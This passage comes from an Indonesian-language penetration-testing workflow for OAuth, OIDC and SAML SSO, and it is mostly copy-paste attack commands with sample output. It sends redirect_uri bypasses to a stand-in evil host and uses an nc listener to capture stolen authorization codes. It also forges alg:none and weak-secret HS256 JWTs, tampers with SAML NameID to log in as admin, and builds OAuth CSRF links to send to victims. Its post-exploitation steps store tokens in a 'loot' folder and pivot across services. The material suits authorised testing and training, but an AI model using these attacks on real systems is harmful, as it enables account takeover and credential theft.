ENCODED_AT=$(python3 -c "import urllib.parse; print(urllib.parse.quote('https://app.example.test@evil.example.test/callback'))")
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ENCODED_AT&scope=openid&state=test123" \
    | grep -Ei "location:|error"

# Test 6: Subdomain of legitimate domain (evil.app.example.test)
ENCODED_SUB=$(python3 -c "import urllib.parse; print(urllib.parse.quote('https://app.example.test.evil.test/callback'))")
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ENCODED_SUB&scope=openid&state=test123" \
    | grep -Ei "location:|error"
```

**OUTPUT BERHASIL ✅ — redirect_uri DITERIMA (VULNERABLE!):**

text

```
HTTP/1.1 302 Found
Location: https://evil.example.test/callback?code=ABC123&state=test123
```

➡️ **KRITIS! redirect_uri validation lemah!**

Bash

```
# Catat bypass yang berhasil
echo "BYPASS: redirect_uri accepted: https://evil.example.test/callback" >> ~/oauth_loot/creds/vulns.txt

# Impact: authorization code bisa dicuri
# Untuk prove impact, setup listener dan trigger flow sebagai victim
# Di lab environment:
nc -lvnp 8080 &  # Simulasi evil server
# Trigger authorization di browser victim dengan redirect ke listener
# Code akan muncul di request log

# Jika code didapat, exchange ke token:
curl -s -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=$CLIENT_ID&redirect_uri=https://evil.example.test/callback&client_secret=GUESSED_OR_LEAKED_SECRET" \
    | jq .
```

**OUTPUT GAGAL ❌ — error: invalid_redirect_uri:**

JSON

```
{"error": "invalid_redirect_uri", "error_description": "The redirect_uri is not registered"}
```

➡️ redirect_uri validation bagus. Lanjut test berikutnya.

---

### Langkah 2.2 — Test State Parameter (CSRF Protection)

Bash

```
# Test 1: Request TANPA state parameter
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid" \
    | grep -Ei "location:|error|state"
```

**OUTPUT BERHASIL ✅ — Request diterima TANPA state:**

text

```
HTTP/1.1 302 Found
Location: https://app.example.test/oauth/callback?code=ABC123
# Tidak ada state parameter di callback!
```

➡️ **VULNERABLE ke OAuth CSRF!**

Bash

```
echo "VULN: Missing state parameter - OAuth CSRF possible" >> ~/oauth_loot/creds/vulns.txt

# Jika callback juga tidak memvalidasi state:
# Attack scenario: attacker membuat authorization flow sendiri,
# force victim browser ke callback URL dengan code milik attacker
# = victim's account links to attacker's OAuth identity
```

Bash

```
# Test 2: State parameter ada tapi predictable/static?
# Coba authorization request beberapa kali, lihat apakah state berubah
for i in {1..3}; do
    curl -s -I "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid&state=FIXED_STATE" \
        | grep -i "location" | grep -o "state=[^&]*"
done
```

**OUTPUT BERHASIL ✅ — State diterima dan tidak divalidasi:**

text

```
# Callback menerima state=FIXED_STATE tanpa error
# Tidak ada session binding check
```

**OUTPUT GAGAL ❌ — State divalidasi:**

JSON

```
{"error": "state_mismatch", "error_description": "State does not match"}
```

➡️ State protection bagus. Lanjut ke test berikutnya.

---

### Langkah 2.3 — Test Scope Manipulation

Bash

```
# Scope normal
NORMAL_SCOPE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('openid profile'))")

# Test: tambah scope privilege tinggi
ESCALATED_SCOPE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('openid profile email admin read:all'))")

# Command 1: Request dengan scope normal dulu (baseline)
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=$NORMAL_SCOPE&state=test123" \
    | grep -Ei "scope|location|error"

# Command 2: Request dengan escalated scope
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=$ESCALATED_SCOPE&state=test123" \
    | grep -Ei "scope|location|error"
```

**OUTPUT BERHASIL ✅ — Escalated scope diterima:**

text

```
HTTP/1.1 302 Found
Location: .../callback?code=ABC123&state=test123
# Atau: consent page menampilkan scope admin tanpa error
```

➡️ Dapatkan token dengan scope escalated:

Bash

```
# Exchange code → token, cek scope di response
curl -s -X POST "$TOKEN_ENDPOINT" \
    -d "grant_type=authorization_code&code=CODE&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI" \
    | jq '.scope'
# Jika scope=admin muncul di token → confirmed scope escalation!
```

**OUTPUT GAGAL ❌ — Scope ditolak atau dikurangi:**

JSON

```
{"scope": "openid profile"}
# Server mengabaikan scope tambahan yang tidak terdaftar
```

---

### Langkah 2.4 — Test Token Leakage (Implicit Flow / Code di URL)

Bash

```
# Check apakah authorization code atau token ada di URL yang bisa bocor via Referrer

# Setelah complete OAuth flow, curl callback page dan lihat apa yang dimuat
# Contoh: callback page yang memuat external resources

curl -s "$REDIRECT_URI?code=TEST_CODE&state=TEST_STATE" \
    | grep -Ei "src=|href=|img|script|iframe" | head -20
```

**OUTPUT BERHASIL ✅ — Callback page memuat external resources:**

HTML

```
<script src="https://analytics.thirdparty.com/tracker.js"></script>
<img src="https://pixel.ad-network.com/pixel?1=1"/>
```

➡️ **Potential code leakage via Referrer header!**

Bash

```
# Callback URL mengandung code= akan bocor ke external resources via Referer
echo "VULN: Authorization code may leak via Referrer to third-party resources" >> ~/oauth_loot/creds/vulns.txt
echo "Callback URL dengan code akan jadi Referer ke: analytics.thirdparty.com" >> ~/oauth_loot/creds/vulns.txt
```

Bash

```
# Test Implicit Flow token di URL fragment
curl -s -i "$AUTH_ENDPOINT?response_type=token&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid&state=test123" \
    | grep -i "location"
```

**OUTPUT BERHASIL ✅ — Token di URL fragment:**

text

```
Location: https://app.example.test/callback#access_token=ACTUAL_TOKEN&token_type=Bearer
```

➡️ **Token exposed in URL!**

Bash

```
# Simpan token untuk analisis lebih lanjut
export ACCESS_TOKEN="ACTUAL_TOKEN"
echo "TOKEN: $ACCESS_TOKEN" >> ~/oauth_loot/tokens/found_tokens.txt

# Test apakah token valid
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$USERINFO_ENDPOINT" | jq .
```

---

### Langkah 2.5 — Test PKCE (Jika PKCE Ada)

Bash

```
# Cek apakah PKCE diperlukan
# Test tanpa code_challenge
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid&state=test123" \
    | grep -Ei "error|location|pkce|challenge"
```

**OUTPUT BERHASIL ✅ — PKCE tidak wajib (kode diterima tanpa challenge):**

text

```
HTTP/1.1 302 Found
Location: .../callback?code=ABC123
# Tidak ada error meski tanpa code_challenge
```

➡️ PKCE optional — potential code interception risk.

Bash

```
# Jika PKCE ada, test validasi verifier
# Generate code_verifier dan code_challenge
python3 << 'PKCE_EOF'
import base64, hashlib, os
verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode()
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b'=').decode()
print(f"Verifier: {verifier}")
print(f"Challenge: {challenge}")
PKCE_EOF
```

Bash

```
# Simpan verifier dan challenge
export CODE_VERIFIER="VERIFIER_FROM_ABOVE"
export CODE_CHALLENGE="CHALLENGE_FROM_ABOVE"

# Exchange code dengan WRONG verifier (test validasi)
curl -s -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=authorization_code&code=AUTH_CODE&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&code_verifier=WRONG_VERIFIER_12345" \
    | jq .
```

**OUTPUT BERHASIL ✅ — Token diberikan meski verifier salah:**

JSON

```
{
  "access_token": "...",
  "token_type": "Bearer"
}
```

➡️ **PKCE validation bypassed!**

Bash

```
echo "VULN: PKCE verifier not validated properly" >> ~/oauth_loot/creds/vulns.txt
```

**OUTPUT GAGAL ❌ — Error invalid verifier (PKCE works correctly):**

JSON

```
{"error": "invalid_grant", "error_description": "Invalid code_verifier"}
```

---

## ═══════════════════════════════════════

## FASE 3: OAUTH TOKEN ANALYSIS

## ═══════════════════════════════════════

### Langkah 3.1 — Decode dan Analisis JWT Token

> Jika access_token atau id_token berformat JWT (tiga bagian dipisah titik: `xxx.yyy.zzz`)

Bash

```
# Simpan token yang didapat
export JWT_TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Command 1: Decode dengan jwt_tool
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT_TOKEN" 2>/dev/null

# Command 2: Manual decode (tidak perlu tools)
echo "$JWT_TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq .  # Header
echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .  # Payload

# Command 3: Simpan decoded output
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT_TOKEN" > ~/oauth_loot/tokens/jwt_decoded.txt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — JWT decoded:**

JSON

```
Token header values:
[+] alg = "RS256"
[+] kid = "key-id-123"
[+] typ = "JWT"

Token payload values:
[+] iss = "https://auth.example.test"
[+] sub = "248289761001"
[+] aud = "webclient-123"
[+] exp = 1893456000
[+] iat = 1893452400
[+] email = "alice@example.test"
[+] scope = "openid profile email"
```

➡️ **Analisis tiap field:**

Bash

```
# Cek fields kritis
# 1. alg: RS256 (asymmetric - lebih aman) atau HS256 (symmetric - cek weak secret)
# 2. iss: apakah sesuai dengan authorization server?
# 3. aud: apakah sesuai dengan client_id?
# 4. exp: apakah expired? Coba replay token expired
# 5. scope: apakah ada scope yang unexpected?

# Ekstrak alg untuk test berikutnya
JWT_ALG=$(python3 -c "
import base64, json, sys
header = sys.argv[1].split('.')[0]
padding = len(header) % 4
header += '=' * (4 - padding) if padding else ''
decoded = base64.urlsafe_b64decode(header)
print(json.loads(decoded)['alg'])
" "$JWT_TOKEN" 2>/dev/null)
echo "Algorithm: $JWT_ALG"
```

---

### Langkah 3.2 — Test JWT Vulnerabilities

#### Test A: Algorithm None Attack

Bash

```
# Hanya test di lab yang diizinkan!
# Buat JWT dengan alg=none
python3 << 'JWT_NONE_EOF'
import base64, json

# Original header dari token yang didapat
header = {"alg": "none", "typ": "JWT"}

# Original payload - sesuaikan dengan payload yang ditemukan
payload = {
    "sub": "248289761001",
    "email": "alice@example.test",
    "iss": "https://auth.example.test",
    "aud": "webclient-123"
}

# Encode tanpa signature
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
token_none = f"{h}.{p}."

print(f"[+] alg:none JWT Token:")
print(token_none)
JWT_NONE_EOF
```

Bash

```
# Test apakah token dengan alg:none diterima
export NONE_TOKEN="PASTE_TOKEN_FROM_ABOVE"
curl -s -H "Authorization: Bearer $NONE_TOKEN" "$USERINFO_ENDPOINT" | jq .
```

**OUTPUT BERHASIL ✅ — Token diterima (VULNERABLE!):**

JSON

```
{
  "sub": "248289761001",
  "email": "alice@example.test"
}
```

➡️ **CRITICAL: alg:none accepted!**

Bash

```
echo "VULN: JWT alg:none accepted - signature bypass possible" >> ~/oauth_loot/creds/vulns.txt
```

**OUTPUT GAGAL ❌ — Token ditolak:**

JSON

```
{"error": "invalid_token", "error_description": "Invalid signature"}
```

#### Test B: JWT Weak Secret (HS256 only)

Bash

```
# Hanya jika alg=HS256
if [ "$JWT_ALG" = "HS256" ]; then
    echo "[*] Testing weak HMAC secret..."
    
    # Gunakan jwt_tool untuk test weak secrets
    python3 ~/tools/jwt_tool/jwt_tool.py "$JWT_TOKEN" -C -d /usr/share/wordlists/rockyou.txt 2>/dev/null
fi
```

**OUTPUT BERHASIL ✅ — Weak secret ditemukan:**

text

```
[+] secret found: "secret123"
```

Bash

```
# Buat token palsu dengan secret yang ditemukan
export JWT_SECRET="secret123"
python3 << 'FORGE_EOF'
import hmac, hashlib, base64, json, os

secret = os.environ['JWT_SECRET']
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "ADMIN_USER_ID",    # Ganti dengan target user
    "email": "admin@example.test",
    "iss": "https://auth.example.test",
    "aud": "webclient-123",
    "role": "admin"
}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
msg = f"{h}.{p}"

sig = hmac.new(secret.encode(), msg.encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

print(f"Forged token: {msg}.{sig_b64}")
FORGE_EOF
```

---

### Langkah 3.3 — Test Token Replay

Bash

```
# Test apakah token expired masih bisa digunakan
# (Simpan token lama, tunggu expired, test ulang)

# Test replay token yang sama dua kali
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$USERINFO_ENDPOINT" | jq .
sleep 2
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$USERINFO_ENDPOINT" | jq .
```

**OUTPUT BERHASIL ✅ — Token masih valid di-replay:**

JSON

```
{"sub": "...", "email": "..."}
{"sub": "...", "email": "..."}
```

➡️ Token bisa di-replay (normal jika belum expired).

Bash

```
# Test refresh token reuse
curl -s -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=$CLIENT_ID" \
    | jq .

# Gunakan refresh token yang SAMA lagi setelah dipakai
curl -s -X POST "$TOKEN_ENDPOINT" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=$CLIENT_ID" \
    | jq .
```

**OUTPUT BERHASIL ✅ — Refresh token bisa dipakai ulang (no rotation):**

JSON

```
# Kedua request sama-sama menghasilkan access_token baru
{"access_token": "NEW_TOKEN_1"}
{"access_token": "NEW_TOKEN_2"}
```

➡️ **Refresh token tidak di-rotate!** Jika attacker mencuri refresh token, bisa gunakan terus menerus.

---

## ═══════════════════════════════════════

## FASE 4: ACCOUNT LINKING ATTACK

## ═══════════════════════════════════════

### Langkah 4.1 — Identifikasi Account Linking Logic

Bash

```
# Lihat UserInfo endpoint untuk cek field apa yang dipakai untuk account mapping
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$USERINFO_ENDPOINT" | jq .
```

**OUTPUT BERHASIL ✅ — UserInfo response:**

JSON

```
{
  "sub": "248289761001",
  "name": "Alice Example",
  "email": "alice@example.test",
  "email_verified": true,
  "iss": "https://auth.example.test"
}
```

➡️ **Analisis kritis:**

Bash

```
# Pertanyaan yang harus dijawab:
# 1. Apakah aplikasi mapping account berdasarkan "email" saja?
# 2. Apakah "email_verified" dicheck?
# 3. Apakah "sub" (subject identifier) yang unik dipakai?
# 4. Apakah "iss" (issuer) diverifikasi?

# Test: Jika email dipakai untuk linking, apa yang terjadi jika email sama
# tapi dari OAuth provider berbeda?

# Check apakah ada endpoint account-linking
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$TARGET/api/account/link" | jq .
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$TARGET/api/me" | jq .
```

---

### Langkah 4.2 — OAuth CSRF Attack (Jika State Tidak Ada)

> **SYARAT:** State parameter hilang atau tidak divalidasi (dari Langkah 2.2)

Bash

```
# Scenario: Attacker memiliki account, ingin link akun mereka ke victim's account

# Step 1: Sebagai ATTACKER, mulai OAuth flow
# Intercept/stop di step authorization (JANGAN complete flow)
# Catat: authorization code ATTACKER (sebelum di-exchange)

# Step 2: Buat crafted callback URL
ATTACKER_CODE="CODE_ATTACKER_DAPAT"
CRAFTED_CALLBACK="$REDIRECT_URI?code=$ATTACKER_CODE"
# Jika tidak ada state: &state tidak perlu ada

# Step 3: Kirim crafted URL ke VICTIM (social engineering, stored XSS, dll)
echo "Crafted URL: $CRAFTED_CALLBACK"
# Victim membuka URL ini → aplikasi mengira ini adalah OAuth callback victim
# → account victim terhubung ke OAuth identity ATTACKER
```

---

## ═══════════════════════════════════════

## FASE 5: SAML SSO TESTING

## ═══════════════════════════════════════

> **Masuk sini jika:** Fase 0 mendeteksi SAML (SAMLResponse di form POST)

### Langkah 5.1 — Capture SAMLResponse

Bash

```
# SAMLResponse biasanya di POST body, base64 encoded
# Intercept dengan Burp saat login SSO

# Decode SAMLResponse dari base64
echo "PASTE_BASE64_SAML_RESPONSE_HERE" | base64 -d | xmllint --format - 2>/dev/null > ~/oauth_loot/saml/decoded_assertion.xml

# Lihat isi assertion
cat ~/oauth_loot/saml/decoded_assertion.xml
```

**OUTPUT BERHASIL ✅ — SAML Assertion decoded:**

XML

```
<?xml version="1.0"?>
<samlp:Response>
  <saml:Assertion ID="A1">
    <saml:Subject>
      <saml:NameID>alice@example.test</saml:NameID>
    </saml:Subject>
    <ds:Signature>
      <ds:SignatureValue>VALID_SIGNATURE_HERE</ds:SignatureValue>
    </ds:Signature>
    <saml:AttributeStatement>
      <saml:Attribute Name="role">
        <saml:AttributeValue>user</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="email">
        <saml:AttributeValue>alice@example.test</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

➡️ Catat semua field penting:

Bash

```
# Ekstrak field kritis dari SAML
grep -o '<saml:NameID>[^<]*</saml:NameID>' ~/oauth_loot/saml/decoded_assertion.xml
grep -o 'Name="[^"]*"' ~/oauth_loot/saml/decoded_assertion.xml
grep -o '<saml:AttributeValue>[^<]*</saml:AttributeValue>' ~/oauth_loot/saml/decoded_assertion.xml
```

---

### Langkah 5.2 — Test SAML Assertion Manipulation

> **Gunakan Burp + SAML Raider extension untuk ini!**

text

```
Setup SAML Raider di Burp:
1. Extensions → BApp Store → SAML Raider → Install
2. Intercept SAMLResponse
3. Klik tab "SAML Raider" di Burp message editor
4. Edit assertion yang diinginkan
```

Bash

```
# Manual test: Modifikasi NameID (tanpa signature - test apakah signature dicek)
# PERINGATAN: Ini hanya untuk lab/CTF environment

# Python script untuk modifikasi SAML (educational)
python3 << 'SAML_MOD_EOF'
import base64, re, sys

# Input: SAMLResponse base64
saml_b64 = "PASTE_SAML_BASE64_HERE"
saml_xml = base64.b64decode(saml_b64).decode('utf-8')

# Modifikasi NameID (ganti user)
modified = saml_xml.replace(
    '<saml:NameID>alice@example.test</saml:NameID>',
    '<saml:NameID>admin@example.test</saml:NameID>'
)

# Encode kembali
modified_b64 = base64.b64encode(modified.encode()).decode()
print(f"Modified SAMLResponse: {modified_b64[:50]}...")
SAML_MOD_EOF
```

Bash

```
# Submit modified SAML via curl
# (Capture original request format dari Burp dulu)
curl -s -X POST "$TARGET/saml/acs" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "SAMLResponse=MODIFIED_BASE64_SAML" \
    -c /tmp/saml_cookies.txt \
    -L | grep -Ei "welcome|dashboard|error|invalid"
```

**OUTPUT BERHASIL ✅ — Login sebagai admin (SIGNATURE NOT CHECKED!):**

HTML

```
<h1>Welcome, admin@example.test</h1>
<p>You are logged in as Administrator</p>
```

➡️ **CRITICAL: SAML signature not verified!**

Bash

```
echo "VULN: SAML signature not verified - assertion manipulation possible" >> ~/oauth_loot/creds/vulns.txt
```

**OUTPUT GAGAL ❌ — Signature validation error:**

HTML

```
<p>Error: Invalid SAML Response - Signature verification failed</p>
```

➡️ Signature divalidasi dengan benar. Lanjut test XSW dengan SAML Raider.

---

### Langkah 5.3 — SAML XSW Testing (Dengan SAML Raider)

text

```
Di Burp + SAML Raider:
1. Intercept POST request dengan SAMLResponse
2. Klik tab "SAML Raider" 
3. Decode SAML → lihat struktur
4. Identifikasi: mana element yang di-sign (ada <ds:Signature>)
5. Gunakan XSW buttons (XSW 1-8) untuk test berbagai struktur

Struktur XSW yang ditest:
XSW 1: Tambah unsigned Assertion di belakang signed Assertion
XSW 2: Wrap signed Assertion dalam element baru
XSW 3-8: Berbagai variasi struktur nesting
```

Bash

```
# Setelah SAML Raider apply XSW, send request dan cek response
# Perhatikan apakah:
# - Signature masih valid (karena signed node tidak berubah)
# - Aplikasi memakai node mana? (yang signed atau yang attacker tambahkan)

# Log hasil testing
cat >> ~/oauth_loot/saml/xsw_results.txt << 'EOF'
XSW Test Results:
XSW1: [PASS/FAIL] - [Notes]
XSW2: [PASS/FAIL] - [Notes]
XSW3: [PASS/FAIL] - [Notes]
EOF
```

---

## ═══════════════════════════════════════

## FASE 6: POST-EXPLOITATION

## ═══════════════════════════════════════

### Langkah 6.1 — Gunakan Token yang Didapat

Bash

```
# Test akses ke berbagai API endpoints
declare -a API_ENDPOINTS=(
    "/api/me"
    "/api/user"
    "/api/users"
    "/api/admin"
    "/api/profile"
    "/userinfo"
)

for endpoint in "${API_ENDPOINTS[@]}"; do
    echo -n "Testing $endpoint: "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $ACCESS_TOKEN" \
        "$TARGET$endpoint")
    echo "HTTP $STATUS"
    
    if [[ "$STATUS" == "200" ]]; then
        curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$TARGET$endpoint" | jq . \
            | tee -a ~/oauth_loot/tokens/api_responses.txt
    fi
done
```

**OUTPUT BERHASIL ✅ — Admin endpoint accessible:**

JSON

```
{
  "users": [
    {"id": 1, "email": "admin@example.test", "role": "admin"},
    {"id": 2, "email": "alice@example.test", "role": "user"}
  ]
}
```

---

### Langkah 6.2 — Cross-Service Testing dengan Token

Bash

```
# OAuth token sering bisa dipakai di berbagai service
# Test reuse ke API endpoints lain

# Cek apakah ada multiple services yang pakai OAuth provider yang sama
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "https://api.corp.example.test/v1/me" | jq .
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "https://internal.example.test/api/user" | jq .

# Kumpulkan informasi untuk pivot
echo "=== OAuth Token Recon ===" >> ~/oauth_loot/creds/summary.txt
echo "Access Token: $ACCESS_TOKEN" >> ~/oauth_loot/creds/summary.txt
echo "UserInfo: $(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" $USERINFO_ENDPOINT)" >> ~/oauth_loot/creds/summary.txt
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`invalid_redirect_uri`|redirect_uri tidak terdaftar|Bandingkan exact URI yang valid, coba bypass teknik|
|`invalid_grant`|Code expired atau sudah dipakai|Gunakan fresh code|
|`invalid_client`|client_id/secret salah|Periksa di source code/JS|
|`invalid_scope`|Scope tidak diizinkan|Cek registered scopes di discovery endpoint|
|`state mismatch`|State validation benar|OAuth CSRF protection aktif, ganti test vector|
|JWT `invalid_signature`|Token dimodifikasi|Lihat alg — coba RS256 vs HS256 confusion|
|JWT `expired`|Token expired|Coba replay token expired (mungkin tidak dicheck)|
|SAML `400 Bad Request`|XML malformed|Revert perubahan, ubah satu hal saja|
|SAML signature valid tapi auth gagal|Conditions/recipient salah|Cek NotBefore/NotOnOrAfter di SAML|
|State selalu berubah|Session-bound state|Gunakan OAuth transaction yang sama|
|Burp tidak capture|HTTPS MITM issue|Install Burp CA certificate|
|`alg:none` ditolak|Algorithm validation benar|Coba RS256→HS256 confusion|

### Jika Buntu — Google Search Queries yang Efektif:

Bash

```
# Untuk error spesifik OAuth
# "oauth redirect_uri bypass site:portswigger.net"
# "oauth state missing account takeover"
# "CVE SAML XSW 2024"

# Untuk target spesifik (jika diketahui OAuth library yang dipakai)
# "keycloak CVE 2024"
# "okta oauth vulnerability"
# "azure ad oauth bypass"

# Resource referensi:
# https://portswigger.net/web-security/oauth
# https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
# https://owasp.org/www-project-web-security-testing-guide/
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Temukan Authentication Flow
│
├─ FASE 0: Identifikasi Protocol
│   ├─ [OAuth/OIDC] → Capture /authorize request
│   └─ [SAML] → Capture SAMLResponse → FASE 5
│
├─ FASE 1: Grant Type
│   ├─ [response_type=code] → Authorization Code Flow
│   ├─ [response_type=token] → Implicit Flow → LANGSUNG cek token di URL
│   └─ [client_credentials] → Cek scope overpermission
│
├─ FASE 2: OAuth Vulnerability Tests (SEMUA harus ditest!)
│   ├─ [redirect_uri bypass] → Code theft → Account Takeover
│   ├─ [state missing/weak] → OAuth CSRF → Unwanted account linking
│   ├─ [scope escalation] → Unauthorized API access
│   ├─ [token in URL] → Token leakage via Referrer
│   └─ [PKCE bypass] → Code interception
│
├─ FASE 3: JWT Analysis (jika token = JWT)
│   ├─ [alg:none] → Signature bypass
│   ├─ [weak HS256 secret] → Token forgery
│   └─ [RS256→HS256 confusion] → Token forgery
│
├─ FASE 4: Account Linking
│   ├─ [email-based linking] → Provider confusion attack
│   └─ [OAuth CSRF + no state] → Force link to attacker identity
│
└─ FASE 5: SAML (Jika SSO/SAML)
    ├─ [No signature check] → Direct assertion manipulation
    ├─ [XSW attack] → Parser/validator discrepancy
    └─ [Role/NameID manipulation] → Privilege escalation
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://app.example.test"
export AUTH_ENDPOINT="http://auth.example.test/authorize"
export TOKEN_ENDPOINT="http://auth.example.test/token"
export USERINFO_ENDPOINT="http://auth.example.test/userinfo"
export CLIENT_ID="webclient-123"
export REDIRECT_URI="https://app.example.test/oauth/callback"
export ACCESS_TOKEN=""   # Isi setelah dapat token
export JWT_TOKEN=""      # Isi jika token adalah JWT
mkdir -p ~/oauth_loot/{tokens,saml,requests,creds}

# === DISCOVERY ===
curl -s "$AUTH_SERVER/.well-known/openid-configuration" | jq .    # OIDC Discovery
curl -s "$AUTH_SERVER/.well-known/jwks.json" | jq .               # Public keys

# === REDIRECT URI TESTS ===
# Evil domain
curl -si "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=https%3A%2F%2Fevil.example.test%2Fcallback&scope=openid&state=test" | grep -Ei "location|error"
# Path append
curl -si "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI/evil'))")&scope=openid&state=test" | grep -Ei "location|error"

# === STATE TESTS ===
# No state
curl -si "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid" | grep -Ei "location|error"

# === SCOPE ESCALATION ===
curl -si "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid%20admin&state=test" | grep -Ei "scope|error"

# === JWT ANALYSIS ===
python3 ~/tools/jwt_tool/jwt_tool.py "$JWT_TOKEN"                 # Decode JWT
echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . # Manual decode payload

# === TOKEN REPLAY ===
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" "$USERINFO_ENDPOINT" | jq .

# === SAML DECODE ===
echo "SAML_BASE64" | base64 -d | xmllint --format - 2>/dev/null

# === CROSS SERVICE PIVOT ===
# Setelah dapat OAuth token/credentials:
# → Jika JWT berisi email/username → coba credential reuse ke SSH, API lain
# → Jika dapat admin scope → ke <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
# → Jika environment AD → ke <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
# → Jika ada JWT → ke <a href="/docs/jwt" class="text-[#00b4d8] hover:underline font-mono font-semibold">28_jwt_workflow.md</a> untuk detail
```

---

> **➡️ NEXT:** Setelah OAuth/SSO testing selesai:
> 
> - **[🔐 28 — JWT Workflow](/docs/jwt)** — Detail JWT testing (algorithm confusion, key confusion, dll)
> - **[🛡️ 29 — CSRF Workflow](/docs/csrf)** — OAuth CSRF lebih detail
> - **[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)** — Jika OAuth terhubung ke Active Directory / enterprise SSO
> - **[🔌 30 — API Security Workflow](/docs/api-security)** — Testing API endpoints yang diakses dengan OAuth token